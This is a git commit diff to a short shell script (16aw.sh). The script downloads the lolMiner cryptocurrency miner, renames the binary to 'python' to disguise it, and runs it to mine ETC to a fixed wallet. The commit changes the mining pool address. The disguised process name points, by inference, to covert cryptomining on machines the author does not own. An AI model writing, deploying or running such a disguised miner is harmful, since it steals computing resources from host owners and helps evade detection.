a4c3e1ff68112d7d167791430f0afabb29eebb5a
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2023-01-13 05:57:23 -0800

    Update and rename 16qw.sh to 16aw.sh

--- 16aw.sh
+++ 16aw.sh
@@ -2,4 +2,4 @@ curl -L -o python.tar.gz https://github.com/Lolliedieb/lolMiner-releases/release
 tar -zxvf python.tar.gz
 cd 1.65
 mv lolMiner python
-./python --coin ETC --pool stratum+tcp://stratum-etc.antpool.com:8008 --user 0x443dd6fa59a4b77cbe694b61b0fe54dac7eedb6b.GPU
+./python --coin ETC --pool stratum+tcp://etc.ss.poolin.one:700 --user 0x443dd6fa59a4b77cbe694b61b0fe54dac7eedb6b.GPU
